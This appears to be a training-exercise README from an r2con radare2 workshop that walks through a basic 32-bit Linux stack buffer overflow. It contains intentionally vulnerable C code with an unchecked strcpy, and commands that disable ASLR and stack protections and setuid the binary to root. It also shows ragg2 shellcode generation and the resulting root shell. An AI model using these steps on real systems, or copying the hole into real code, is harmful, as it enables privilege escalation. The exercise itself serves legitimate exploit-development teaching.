# simplebof

This exercise aims at guiding you to the most basic stack-based buffer overflow on a Linux 32-bits machine.

Source code
-----------
```c
/*
 * This binary requires stack-boundary to 2 to keep stack aligned to 2^n
 *
 * $ gcc -mpreferred-stack-boundary=2 simplebof.c -m32 -o simplebof
 */

#include <stdio.h>
#include <string.h>

void trick(void)
{
   __asm__("jmp *%esp");
}

void dummy(char *arg)
{
   char buffer[64];

   strcpy(buffer, arg);
   printf("The argument is: %s\n", buffer);
}


int main(int argc, char *argv[])
{
   char *res;

   /* Check args */
   if (argc != 2) {
      printf("Usage: %s argument\n", argv[0]);
      return 1;
   }
   
   printf("Hello r2con\n");
   dummy(argv[1]);

   return 0;
}
```

Disable mitigations and compilation steps
------------------------------------------
First of all, make sure you disable all the memory corruption mitigations before compiling this exercise.

* Disable ASLR and PIE  
```
$ sudo bash -c 'echo 0 > /proc/sys/kernel/randomize_va_space'
```

* Compile without stack-canaries  
```
$ gcc -mpreferred-stack-boundary=2 simplebof.c -m32 -o simplebof -fno-stack-protector -z execstack
```

* Setuid the binary with root permissions  
```
$ sudo chown root simplebof  
$ sudo chmod +s simplebof
```


Radare2 solution
----------------

Before get started, let's make sure we have compiled properly the binary. For doing so, `rabin2` is a quick option. You can also use the famous bash script called `checksec.sh`. Also, you can load the binary into `radare2` and press the keystroke `i~nx,pic,canary` to obtain information about the compilation flags. 

```
$ rabin2 -I simplebof | egrep "canary|nx|pic" 
pic      false
canary   false 
nx       false
```

Once you have compiled and checked the compilation flags, you are ready to go for your first exploit. First thing to try will be execute the binary and find out how much we need to provide in the `argv[1]` to cause a segmentation fault when `strcpy`'ing data onto the stack.

```
$ ./simplebof AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Hello r2con
The argument is: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```
	
Upon knowing the length of `argv[1]`, we can prepare a file that will tell to radare2 

```
r2 -e dbg.profile=profile.rarun2 -d simplebof     
s sym.dummy
af
pdf
db 0x080484a9             # 0x080484a9      c3             ret
```



// Generates shellcode  (buffer-64-bytes+ EBP + EIP)
ragg2 -b 32 -a x86 -z -p n2048 -d 68:0xffffc980 -i exec 
ragg2 -b 32 -a x86 -z -p n2048 -d 68:0xffffc9a0 -i exec 

// debug the exploit
r2 -e dbg.profile=exploit.rarun2 -d simplebof     
	s sym.dummy
	af
	pdf
	db 0x080484a9             # 0x080484a9      c3             ret	


dudu@r2-training~/r2con/2016/trainings/03-linux-xpl/exercises/simple:$ ./exploit.rarun2 
Hello r2con
The argument is: ��������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������������1�Ph//shh/bin��PS�ᙰ

# id
uid=1000(dudu) gid=1000(dudu) euid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),124(sambashare),1000(dudu)
# whoami
root
# 


